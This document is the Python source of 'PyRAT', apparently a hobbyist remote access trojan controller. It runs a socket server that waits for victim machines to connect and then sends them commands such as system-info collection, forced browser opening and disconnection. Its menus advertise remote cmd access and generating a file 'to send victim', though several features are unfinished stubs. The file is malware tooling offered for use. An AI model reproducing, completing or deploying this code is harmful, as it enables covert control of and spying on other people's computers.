#https://beatino029.github.io/Beato029/settings.json

import getpass
import socket
import webbrowser
from datetime import datetime
import colorama
from colorama import Fore
from platform import system as get_system_name
import os
import platform
import geocoder
import requests
from tkinter import messagebox



colorama.init(autoreset=True)

r = Fore.RED
g = Fore.GREEN
b = Fore.BLUE
y = Fore.YELLOW
w = Fore.WHITE

info = (w + "[" + g + "Info" + w + "]")
error = (w + "[" + r + "Error" + w + "]")
suggestion = (w + "[" + b + "~" + w + "]")

VERSION = "1.0.0"

host = socket.gethostname()
ip_host = socket.gethostbyname(socket.gethostname())

with open("client.txt", "w") as c:
    c.close()


def THREADING():
    messagebox.showerror("Error","error")


def get_platform():
    if get_system_name() == "Windows":
        PyRAT()

    else:
        messagebox.showerror("Error", "Dispositive not compatible")
        quit()

def PyRAT():
    os.system("cls")
    pyrat = """
____        ____      _  _____
|  _ \ _   _|  _ \    / \|_   _|
| |_) | | | | |_) |  / _ \ | |
|  __/| |_| |  _ <  / ___ \| |
|_|    \__, |_| \_\/_/   \_\_|
        |___/"""
    print(g + pyrat)
    print(r + "-" * 50)
    Start()

def Start():
    ip_0000 = (y + "0") + "." + (y + "0") + "." + (y + "0") + "." + (y + "0")
    print(info + " Server listening on", ip_0000 + w + ":" + y + "65535")
    print(suggestion, "Print 'help' to view command")
    print(suggestion, "Print 'update' to check update and view documentation")
    print("")
    Command()

def Command():
    while True:
        command = input("\033[4m" + host + "\033[0m" + " >>")

        if command == "exit":
            quit()

        elif command == "help":
            print("""
Command:                Description:
 ------------            -----------------------
update                  Check update        
version                 View version PyRAT
python                  Start python terminal
start                   Start backdoor
sysinfo                 Find your ip used
cls                     Clear screen
getsave                 View path where save
getsavels               View file/folder in fold
web                     Open YouTube channel
github                  Give GitHub link
exit                    Close program
""")

        elif command == "web":
            webbrowser.open("https://www.youtube.com/channel/UCmTNsE_lXbdr37M1SCVNWlg")

        elif command == "github":
            webbrowser.open("https://github.com/Beatino029/Beato029/tree/main")

        elif command == "generate":
            def IP_REQ():
                try:
                    ip_req = input(f"Ip of your device for connect (127.0.0.1): ")
                except:
                    print(error, "Invalid characters")
                    IP_REQ()

            def PORT_REQ():
                try:
                    port_req = int(input("Port use for connect (recommended: 8080): "))
                except:
                    print(error, "Invalid characters")
                    PORT_REQ()

            def NAME_FILE():
                try:
                    name_file = str(input("name file to send victim number and point will remove (example: hello): "))
                    invalid_value = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "."]
                    name_file = name_file.replace("0", "")
                    name_file = name_file.replace("1", "")
                    name_file = name_file.replace("2", "")
                    name_file = name_file.replace("3", "")
                    name_file = name_file.replace("4", "")
                    name_file = name_file.replace("5", "")
                    name_file = name_file.replace("6", "")
                    name_file = name_file.replace("7", "")
                    name_file = name_file.replace("8", "")
                    name_file = name_file.replace("9", "")
                    name_file = name_file.replace(".", "")
                    name_file = name_file.replace(" ", "")
                    name_file = name_file.replace("|", "")
                    name_file = name_file.replace("!", "")
                    name_file = name_file.replace("£", "")
                    name_file = name_file.replace("$", "")
                    name_file = name_file.replace("%", "")
                    name_file = name_file.replace("&", "")
                    name_file = name_file.replace("/", "")
                    name_file = name_file.replace("(", "")
                    name_file = name_file.replace(")", "")
                    name_file = name_file.replace("=", "")
                    name_file = name_file.replace("?", "")
                    name_file = name_file.replace("'", "")
                    name_file = name_file.replace("^", "")
                    name_file = name_file.replace("*", "")
                    name_file = name_file.replace("-", "")
                except:
                    print(error, "Invalid characters")

            def create_file():
                print()
                #auto_py_to_exe.__main__.run() #finire
                #creazione file .exe


            IP_REQ()
            PORT_REQ()
            NAME_FILE()


        elif command == "getsave":
            getsave = os.getcwd()
            print(getsave)


        elif command == "sysinfo":
            sysinfo_logo = """
 ______   ______ _____ _____ __  __   ___ _   _ _____ ___
/ ___\ \ / / ___|_   _| ____|  \/  | |_ _| \ | | ___/ ___ \.
\____ \ V /\___ \ | | |  _| | |\/| |  | ||  \| | |_ | | | |
 ___) || |  ___) || | | |___| |  | |  | || |\  |  _|| |_| |
|____/ |_| |____/ |_| |_____|_|  |_| |___|_| \_|_|   \___/ 
"""
            print(g + sysinfo_logo)
            print("")

            geocode_ip = geocoder.ip("me")
            local = geocoder.location(geocode_ip)
            lt = local.lat
            ln = local.lng
            url = "http://ipinfo.io/json"
            req = requests.get(url)
            private_ip = req.json()["ip"]
            hostname = req.json()["hostname"]
            city = req.json()["city"]
            region = req.json()["region"]
            country = req.json()["country"]
            organization = req.json()["org"]
            postal_code = req.json()["postal"]
            timezone = req.json()["timezone"]

            print(f"""
Operative System: {platform.system()}
Hostname: {platform.node()}
Username: {getpass.getuser()}
Version System: {platform.release()}
IPv4: {socket.gethostbyname(socket.gethostname())}

Country: {country}
Region: {region}
City: {city}
Timezone: {timezone}
Time: {datetime.now().replace(microsecond=0)}
Latitude: {lt}
Longitude: {ln}

Private IP: {private_ip}
Hostname IP: {hostname}
Organization: {organization}
Postal code: {postal_code}
    """)

        elif command == "cls":
            os.system("cls")
            PyRAT()

        elif command == "update":
            url = "https://beatino029.github.io/Beato029/settings.json"
            update = requests.get(url)
            print("Checkin for udpate...")
            UPDATE = update.json()["version"]
            if UPDATE > VERSION:
                print(info, f"Update {y + UPDATE + Fore.RESET} is avaiable...")
                print(info, "Opening browser page...")
                webbrowser.open("download_update.html")
            else:
                print(info, "Not update avaiable")

        elif command == "version":
            print(f"current version is: {VERSION}")

        elif command == "":
            Command()
        elif command == " ":
            Command()

        elif command == "getsavels":
            path = os.getcwd()
            for filename in os.listdir(path):
                if filename.endswith(".py"):
                    print(r + filename)

        elif command == "python":
            open("python.exe")
        

        elif command == "start":
            os.system("cls")
            while True:
                if True:
                    def BACKDOOR_LOGO():
                        backdoor_logo = """
 ____    _    ____ _  ______   ___   ___  ____  
| __ )  / \  / ___| |/ /  _ \ / _ \ / _ \|  _ \ 
|  _ \ / _ \| |   | ' /| | | | | | | | | | |_) |
| |_) / ___ \ |___| . \| |_| | |_| | |_| |  _ < 
|____/_/   \_\____|_|\_\____/ \___/ \___/|_| \_\ from PyRAT"""
                        print(g + backdoor_logo)
                        print(r + "-" * 50)

                    BACKDOOR_LOGO()

                    def connection():
                        ip_req = "192.168.1.104"  # input("Enter IP for connection (Your device): ")
                        port_req = 8080  # int(input("Enter PORT for connection: "))
                        try:
                            s = socket.socket()
                            s.bind((ip_req, port_req))
                            s.listen()
                            print(info + " Server listening on", y + ip_req + w + ":" + y + str(port_req))
                            conn, addr = s.accept()
                            addr_client = conn.recv(1024)
                            addr_client = addr_client.decode()
                            print(info, f"Client: {addr_client} connect")

                            def HELP():
                                print("""
Command:                      Description:
------------------            -----------------------
list                          View list conn/req
everylist                     View list every client
uninstall                     Uninstall client
sysinfo                       View info client pc
cmd                           Use client cmd
kill                          Close connection  
chat                          Chat with client
browser                       Open internet page
""")

                            def COMMAND():
                                print(suggestion, "Print 'help' to view command")
                                print("")
                                while True:
                                    root = input("\033[4m" + addr_client + "\033[0m" + " >>")
                                    if root == "sysinfo":
                                        conn.send(root.encode())
                                        sysinfo = conn.recv(1024)
                                        sysinfo = sysinfo.decode()
                                        print(sysinfo)

                                    elif root == "cls":
                                        os.system("cls")
                                        BACKDOOR_LOGO()
                                        COMMAND()

                                    elif root == "help":
                                        HELP()

                                    elif root == "browser":
                                        conn.send(root.encode())
                                        browser_open = input("Enter link (https://): ")
                                        browser_open = str(browser_open)
                                        conn.send(browser_open.encode())

                                    elif root == "kill":
                                        DISCONNECT = "DISCONNECT"
                                        DISCONNECT = str(DISCONNECT)
                                        conn.send(DISCONNECT.encode())
                                        conn.close()
                                        print(info, "Connnection with client close")
                                        PyRAT()




                                    else:
                                        print(error + f"'{root}' command not found")

                            COMMAND()

                        except socket.error as socket_error:
                            messagebox.showerror("Connection error", socket_error)

                    connection()

        else:
            print(error + f" '{command}' command not found")

get_platform()

